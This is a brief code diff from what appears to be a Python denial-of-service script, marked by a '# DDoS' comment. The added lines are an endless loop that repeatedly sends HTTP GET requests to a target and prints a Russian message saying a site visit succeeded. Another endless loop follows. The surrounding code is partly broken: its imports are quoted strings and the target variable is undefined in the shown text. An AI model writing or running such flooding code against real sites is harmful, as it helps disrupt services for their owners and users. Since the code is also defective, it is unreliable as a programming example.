@@ -210,6 +210,11 @@ error = 0
 "import psutil"
 "import flask"
 "import wget"
+
+while True:
+  requests.get(targ)
+  print("[+] Заход на сайт выполнен!")
+  
 # DDoS
 print(  "Zapusk")
 while True:
